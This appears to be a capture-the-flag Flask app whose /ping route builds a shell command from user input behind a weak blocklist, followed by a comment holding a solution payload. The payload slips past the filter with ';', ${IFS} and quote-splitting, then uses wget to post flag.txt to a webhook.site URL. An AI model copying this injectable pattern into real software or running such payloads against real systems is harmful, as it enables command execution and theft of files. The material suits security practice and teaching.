from flask import Flask, request, render_template
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/ping', methods=['POST'])
def ping():
    hostname = request.form.get('hostname')
    if not hostname:
        return "Hostname is required"

    # Input sanitization
    forbidden_patterns = [' ', 'cat', 'flag', '|', '&', '`', '>', '<', '&&', '||']
    for pattern in forbidden_patterns:
        if pattern in hostname:
            print("Invalid pattern found: " + pattern)
            return "Invalid input", 1

    # Execute command
    try:
        command = f"ping -c 1 {hostname}"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            return "Command executed successfully", 0
        else:
            print(stderr.decode())
            return "Command execution failed", 1
    except Exception as e:
        return f"Error: {str(e)}", 1

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)


#localhost;wget${IFS}--post-file=f''lag.txt${IFS}https://webhook.site/330b2599-9108-4b9b-96ec-86cb8259e9ee

